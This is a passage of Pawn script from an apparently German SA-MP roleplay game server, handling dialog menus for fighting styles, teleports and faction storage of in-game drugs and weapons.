					SendClientMessage(playerid, COLOR_GRAD1, "Du hast nicht genug Geld!");
					return 1;
				}
                if(PlayerInfo[playerid][pLevel] < 15)
                {
					SendClientMessage(playerid, COLOR_GRAD1, "Du hast nicht das benötigte Level 15");
					return 1;
				}
			    GivePlayerMoneySave(playerid, -5000);
			    SetPlayerFightingStyle (playerid, FIGHT_STYLE_KUNGFU);
				PlayerInfo[playerid][pFightingStyle] = 6;
			}
			if(listitem == 5)
			{
				SetPlayerFightingStyle (playerid, FIGHT_STYLE_NORMAL);
				PlayerInfo[playerid][pFightingStyle] = 4;
			}
		}
	}
//===== NEWS =====//
	if(dialogid == NEWS)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {//dach
	            SetPlayerPos(playerid, 1649.4564,-1641.6837,83.7813);
				GameTextForPlayer(playerid, "~g~Helilandeplatz der News Zentrale", 5000, 3);
			}
			if(listitem == 1)
			{
			    SetPlayerPos(playerid, 1658.7493,-1691.7506,15.6094);
			    GameTextForPlayer(playerid,"~g~Parkhaus der News Zentrale", 5000, 3);
			}
			if(listitem == 2)
			{
			    SetPlayerPos(playerid, 1654.1954,-1654.9637,22.5156);
			    GameTextForPlayer(playerid,"~g~News Zentrale", 5000, 3);
			}
		}
	}
	if(dialogid == DIALOG_KAMMER)
	{
	    if(response == 1)
	    {
	        if(listitem == 0)
	        {
	            new frak;
	            new val = 4;
	            if(PlayerInfo[playerid][pMember] > 0)
	            {
	                frak = PlayerInfo[playerid][pMember];
				}
				else if(PlayerInfo[playerid][pLeader] > 0)
				{
				    frak = PlayerInfo[playerid][pLeader];
				}
				if(frak == 5 && LCNDrugs - val < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Drogen sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 6 && YakDrugs - val < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Drogen sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 8 && HitmanDrugs - val < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Drogen sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 12 && TriadDrugs - val < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Drogen sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 13 && GroveDrugs - val < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Drogen sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 14 && BallasDrugs - val < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Drogen sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 15 && BikerMats - val < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Drogen sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 16 && VagosDrugs - val < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Drogen sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 17 && AztecaDrugs - val < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Drogen sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 18 && SFRifaDrugs - val < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Drogen sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 19 && RSDrugs - val < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Drogen sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 20 && TerrorDrugs - val < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Drogen sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 21 && WHDrugs - val < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Drogen sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 23 && BrigadaDrugs - val < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Drogen sind nicht in der Fraktionskammer!");
					return 1;
				}
				format(ALLSTRING, sizeof(ALLSTRING), "* Du hast %dg Drogen aus der Fraktionskammer rausgeholt.", val);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, ALLSTRING);








			    new frakstring[512];

				if(frak == 5)
				{
					format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", LCNMats,LCNDrugs);
				}
				else if(frak == 6)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", YakMats,YakDrugs);
				}
				else if(frak == 8)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", HitmanMats,HitmanDrugs);
//					ShowPlayerDialog(playerid,DIALOG_KAMMER,DIALOG_STYLE_LIST,frakstring,"4g Drogen: 5400$ (1350$ je Gramm)\nBaseballschläger: 84$ (20 Mats)\nDeagle: 350$ (20 Mats)\nShotgun: 175$ (20 Mats)\nMP5: 350$ (20 Mats)\nAK47: 525$ (20 Mats)\nDrogen reinlegen\nMaterialen reinlegen\n Sniper"  ,"Auswählen","Abbrechen");
					return 1;
				}
				else if(frak == 12)
				{
			 		format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", TriadMats,TriadDrugs);
				}
				else if(frak == 13)
				{
		      		format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", GroveMats,GroveDrugs);
				}
				else if(frak == 14)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", BallasMats,BallasDrugs);
				}
				else if(frak == 15)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", BikerMats,BikerDrugs);
				}
				else if(frak == 16)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", VagosMats,VagosDrugs);
				}
				else if(frak == 17)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", AztecaMats,AztecaDrugs);
				}
				else if(frak == 18)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", SFRifaMats,SFRifaDrugs);
				}
				else if(frak == 19)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", RSMats,RSDrugs);
				}
				else if(frak == 20)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", TerrorMats,TerrorDrugs);
				}
				else if(frak == 21)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", WHMats,WHDrugs);
				}
				else if(frak == 23)
				{
		            format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", BrigadaMats,BrigadaDrugs);
				}









				ShowPlayerDialog(playerid,DIALOG_KAMMER,DIALOG_STYLE_LIST,frakstring,"4g Drogen: 5400$ (1350$ je Gramm)\nBaseballschläger: 84$ (20 Mats)\nDeagle: 350$ (20 Mats)\nShotgun: 175$ (20 Mats)\nMP5: 350$ (20 Mats)\nAK47: 525$ (20 Mats)\nDrogen reinlegen\nMaterialen reinlegen"  ,"Auswählen","Abbrechen");
				PlayerInfo[playerid][pDrugs] += val;
				GivePlayerMoneySave(playerid, -5400);
				FraktionsKasse[frak-1] += 5400;
				if(frak == 5)
				{
					LCNDrugs -= val;
				}
				else if(frak == 6)
				{
				    YakDrugs -= val;
				}
				else if(frak == 8)
				{
				    HitmanDrugs -= val;
				}
				else if(frak == 12)
				{
				    TriadDrugs -= val;
				}
				else if(frak == 13)
				{
				    GroveDrugs -= val;
				}
				else if(frak == 14)
				{
				    BallasDrugs -= val;
				}
				else if(frak == 14)
				{
				    BikerDrugs -= val;
				}
				else if(frak == 16)
				{
				    VagosDrugs -= val;
				}
				else if(frak == 17)
				{
				    AztecaDrugs -= val;
				}
				else if(frak == 18)
				{
				    SFRifaDrugs -= val;
				}
				else if(frak == 19)
				{
				    RSDrugs -= val;
				}
				else if(frak == 20)
				{
				    TerrorDrugs -= val;
				}
				else if(frak == 21)
				{
				    WHDrugs -= val;
				}
				else if(frak == 23)
				{
				    BrigadaDrugs -= val;
				}
				SaveFrakDrugs();
            }
			else if(listitem == 1)
			{
	            new frak;
	            if(PlayerInfo[playerid][pMember] > 0)
	            {
	                frak = PlayerInfo[playerid][pMember];
				}
				else if(PlayerInfo[playerid][pLeader] > 0)
				{
				    frak = PlayerInfo[playerid][pLeader];
				}
				if(frak == 5 && LCNMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 6 && YakMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 8 && HitmanMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 12 && TriadMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 13 && GroveMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 14 && BallasMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 15 && BikerMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 16 && VagosMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 17 && AztecaMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 18 && SFRifaMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 19 && RSMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 20 && TerrorMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 21 && WHMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 23 && BrigadaMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				if(frak == 5)
				{
					LCNMats -= 20;
				}
				else if(frak == 6)
				{
				    YakMats -= 20;
				}
				else if(frak == 8)
				{
				    HitmanMats -= 20;
				}
				else if(frak == 12)
				{
				    TriadMats -= 20;
				}
				else if(frak == 13)
				{
				    GroveMats -= 20;
				}
				else if(frak == 14)
				{
				    BallasMats -= 20;
				}
				else if(frak == 15)
				{
				    BikerMats -= 20;
				}
				else if(frak == 16)
				{
				    VagosMats -= 20;
				}
				else if(frak == 17)
				{
				    AztecaMats -= 20;
				}
				else if(frak == 18)
				{
				    SFRifaMats -= 20;
				}
				else if(frak == 19)
				{
				    RSMats -= 20;
				}
				else if(frak == 20)
				{
				    TerrorMats -= 20;
				}
				else if(frak == 21)
				{
				    WHMats -= 20;
				}
				else if(frak == 23)
				{
				    BrigadaMats -= 20;
				}





			    new frakstring[512];

				if(frak == 5)
				{
					format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", LCNMats,LCNDrugs);
				}
				else if(frak == 6)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", YakMats,YakDrugs);
				}
				else if(frak == 8)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", HitmanMats,HitmanDrugs);
//					ShowPlayerDialog(playerid,DIALOG_KAMMER,DIALOG_STYLE_LIST,frakstring,"4g Drogen: 5400$ (1350$ je Gramm)\nBaseballschläger: 84$ (20 Mats)\nDeagle: 350$ (20 Mats)\nShotgun: 175$ (20 Mats)\nMP5: 350$ (20 Mats)\nAK47: 525$ (20 Mats)\nDrogen reinlegen\nMaterialen reinlegen\n Sniper"  ,"Auswählen","Abbrechen");
				//	return 1;
				}
				else if(frak == 12)
				{
			 		format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", TriadMats,TriadDrugs);
				}
				else if(frak == 13)
				{
		      		format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", GroveMats,GroveDrugs);
				}
				else if(frak == 14)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", BallasMats,BallasDrugs);
				}
				else if(frak == 15)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", BikerMats,BikerDrugs);
				}
				else if(frak == 16)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", VagosMats,VagosDrugs);
				}
				else if(frak == 17)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", AztecaMats,AztecaDrugs);
				}
				else if(frak == 18)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", SFRifaMats,SFRifaDrugs);
				}
				else if(frak == 19)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", RSMats,RSDrugs);
				}
				else if(frak == 20)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", TerrorMats,TerrorDrugs);
				}
				else if(frak == 21)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", WHMats,WHDrugs);
				}
				else if(frak == 23)
				{
		            format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", BrigadaMats,BrigadaDrugs);
				}







				SaveFrakMats();
				ServerWeapon(playerid, 5, 64);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast dir ein Baseballschläger aus der Fraktionskammer genommen (20 Materialien)");
				ShowPlayerDialog(playerid,DIALOG_KAMMER,DIALOG_STYLE_LIST,frakstring,"4g Drogen: 5400$ (1350$ je Gramm)\nBaseballschläger: 84$ (20 Mats)\nDeagle: 350$ (20 Mats)\nShotgun: 175$ (20 Mats)\nMP5: 350$ (20 Mats)\nAK47: 525$ (20 Mats)\nDrogen reinlegen\nMaterialen reinlegen"  ,"Auswählen","Abbrechen");
				GivePlayerMoneySave(playerid, -84);
				FraktionsKasse[frak-1] += 84;
			}
			else if(listitem == 2)
			{
	            new frak;
	            if(PlayerInfo[playerid][pMember] > 0)
	            {
	                frak = PlayerInfo[playerid][pMember];
				}
				else if(PlayerInfo[playerid][pLeader] > 0)
				{
				    frak = PlayerInfo[playerid][pLeader];
				}
				if(frak == 5 && LCNMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 6 && YakMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 8 && HitmanMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 12 && TriadMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 13 && GroveMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 14 && BallasMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 15 && BikerMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 16 && VagosMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 17 && AztecaMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 18 && SFRifaMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 19 && RSMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 20 && TerrorMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 21 && WHMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 23 && BrigadaMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				if(frak == 5)
				{
					LCNMats -= 20;
				}
				else if(frak == 6)
				{
				    YakMats -= 20;
				}
				else if(frak == 8)
				{
				    HitmanMats -= 20;
				}
				else if(frak == 12)
				{
				    TriadMats -= 20;
				}
				else if(frak == 13)
				{
				    GroveMats -= 20;
				}
				else if(frak == 14)
				{
				    BallasMats -= 20;
				}
				else if(frak == 15)
				{
				    BikerMats -= 20;
				}
				else if(frak == 16)
				{
				    VagosMats -= 20;
				}
				else if(frak == 17)
				{
				    AztecaMats -= 20;
				}
				else if(frak == 18)
				{
				    SFRifaMats -= 20;
				}
				else if(frak == 19)
				{
				    RSMats -= 20;
				}
				else if(frak == 20)
				{
				    TerrorMats -= 20;
				}
				else if(frak == 21)
				{
				    WHMats -= 20;
				}
				else if(frak == 23)
				{
				    BrigadaMats -= 20;
				}

			    new frakstring[512];

				if(frak == 5)
				{
					format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", LCNMats,LCNDrugs);
				}
				else if(frak == 6)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", YakMats,YakDrugs);
				}
				else if(frak == 8)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", HitmanMats,HitmanDrugs);
//					ShowPlayerDialog(playerid,DIALOG_KAMMER,DIALOG_STYLE_LIST,frakstring,"4g Drogen: 5400$ (1350$ je Gramm)\nBaseballschläger: 84$ (20 Mats)\nDeagle: 350$ (20 Mats)\nShotgun: 175$ (20 Mats)\nMP5: 350$ (20 Mats)\nAK47: 525$ (20 Mats)\nDrogen reinlegen\nMaterialen reinlegen\n Sniper"  ,"Auswählen","Abbrechen");
				//	return 1;
				}
				else if(frak == 12)
				{
			 		format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", TriadMats,TriadDrugs);
				}
				else if(frak == 13)
				{
		      		format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", GroveMats,GroveDrugs);
				}
				else if(frak == 14)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", BallasMats,BallasDrugs);
				}
				else if(frak == 15)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", BikerMats,BikerDrugs);
				}
				else if(frak == 16)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", VagosMats,VagosDrugs);
				}
				else if(frak == 17)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", AztecaMats,AztecaDrugs);
				}
				else if(frak == 18)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", SFRifaMats,SFRifaDrugs);
				}
				else if(frak == 19)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", RSMats,RSDrugs);
				}
				else if(frak == 20)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", TerrorMats,TerrorDrugs);
				}
				else if(frak == 21)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", WHMats,WHDrugs);
				}
				else if(frak == 23)
				{
		            format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", BrigadaMats,BrigadaDrugs);
				}





				SaveFrakMats();
				ServerWeapon(playerid, 24, 64);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast dir eine Deagle aus der Fraktionskammer genommen (20 Materialien)");
				ShowPlayerDialog(playerid,DIALOG_KAMMER,DIALOG_STYLE_LIST,frakstring,"4g Drogen: 5400$ (1350$ je Gramm)\nBaseballschläger: 84$ (20 Mats)\nDeagle: 350$ (20 Mats)\nShotgun: 175$ (20 Mats)\nMP5: 350$ (20 Mats)\nAK47: 525$ (20 Mats)\nDrogen reinlegen\nMaterialen reinlegen"  ,"Auswählen","Abbrechen");
				GivePlayerMoneySave(playerid, -350);
				FraktionsKasse[frak-1] += 350;
			}
			else if(listitem == 3)
			{
	            new frak;
	            if(PlayerInfo[playerid][pMember] > 0)
	            {
	                frak = PlayerInfo[playerid][pMember];
				}
				else if(PlayerInfo[playerid][pLeader] > 0)
				{
				    frak = PlayerInfo[playerid][pLeader];
				}
				if(frak == 5 && LCNMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 6 && YakMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 8 && HitmanMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 12 && TriadMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 13 && GroveMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 14 && BallasMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 15 && BikerMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 16 && VagosMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 17 && AztecaMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 18 && SFRifaMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 19 && RSMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 20 && TerrorMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 21 && WHMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 23 && BrigadaMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				if(frak == 5)
				{
					LCNMats -= 20;
				}
				else if(frak == 6)
				{
				    YakMats -= 20;
				}
				else if(frak == 8)
				{
				    HitmanMats -= 20;
				}
				else if(frak == 12)
				{
				    TriadMats -= 20;
				}
				else if(frak == 13)
				{
				    GroveMats -= 20;
				}
				else if(frak == 14)
				{
				    BallasMats -= 20;
				}
				else if(frak == 15)
				{
				    BikerMats -= 20;
				}
				else if(frak == 16)
				{
				    VagosMats -= 20;
				}
				else if(frak == 17)
				{
				    AztecaMats -= 20;
				}
				else if(frak == 18)
				{
				    SFRifaMats -= 20;
				}
				else if(frak == 19)
				{
				    RSMats -= 20;
				}
				else if(frak == 20)
				{
				    TerrorMats -= 20;
				}
				else if(frak == 21)
				{
				    WHMats -= 20;
				}
				else if(frak == 23)
				{
				    BrigadaMats -= 20;
				}


			    new frakstring[512];

				if(frak == 5)
				{
					format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", LCNMats,LCNDrugs);
				}
				else if(frak == 6)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", YakMats,YakDrugs);
				}
				else if(frak == 8)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", HitmanMats,HitmanDrugs);
//					ShowPlayerDialog(playerid,DIALOG_KAMMER,DIALOG_STYLE_LIST,frakstring,"4g Drogen: 5400$ (1350$ je Gramm)\nBaseballschläger: 84$ (20 Mats)\nDeagle: 350$ (20 Mats)\nShotgun: 175$ (20 Mats)\nMP5: 350$ (20 Mats)\nAK47: 525$ (20 Mats)\nDrogen reinlegen\nMaterialen reinlegen\n Sniper"  ,"Auswählen","Abbrechen");
				//	return 1;
				}
				else if(frak == 12)
				{
			 		format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", TriadMats,TriadDrugs);
				}
				else if(frak == 13)
				{
		      		format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", GroveMats,GroveDrugs);
				}
				else if(frak == 14)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", BallasMats,BallasDrugs);
				}
				else if(frak == 15)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", BikerMats,BikerDrugs);
				}
				else if(frak == 16)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", VagosMats,VagosDrugs);
				}
				else if(frak == 17)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", AztecaMats,AztecaDrugs);
				}
				else if(frak == 18)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", SFRifaMats,SFRifaDrugs);
				}
				else if(frak == 19)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", RSMats,RSDrugs);
				}
				else if(frak == 20)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", TerrorMats,TerrorDrugs);
				}
				else if(frak == 21)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", WHMats,WHDrugs);
				}
				else if(frak == 23)
				{
		            format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", BrigadaMats,BrigadaDrugs);
				}





				SaveFrakMats();
				ServerWeapon(playerid, 25, 64);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast dir eine Shotgun aus der Fraktionskammer genommen (20 Materialien)");
				ShowPlayerDialog(playerid,DIALOG_KAMMER,DIALOG_STYLE_LIST,frakstring,"4g Drogen: 5400$ (1350$ je Gramm)\nBaseballschläger: 84$ (20 Mats)\nDeagle: 350$ (20 Mats)\nShotgun: 175$ (20 Mats)\nMP5: 350$ (20 Mats)\nAK47: 525$ (20 Mats)\nDrogen reinlegen\nMaterialen reinlegen"  ,"Auswählen","Abbrechen");
				GivePlayerMoneySave(playerid, -175);
				FraktionsKasse[frak-1] += 175;
			}
			else if(listitem == 4)
			{
	            new frak;
	            if(PlayerInfo[playerid][pMember] > 0)
	            {
	                frak = PlayerInfo[playerid][pMember];
				}
				else if(PlayerInfo[playerid][pLeader] > 0)
				{
				    frak = PlayerInfo[playerid][pLeader];
				}
				if(frak == 5 && LCNMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 6 && YakMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 8 && HitmanMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 12 && TriadMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 13 && GroveMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 14 && BallasMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 15 && BikerMats - 20 < 0)
				{
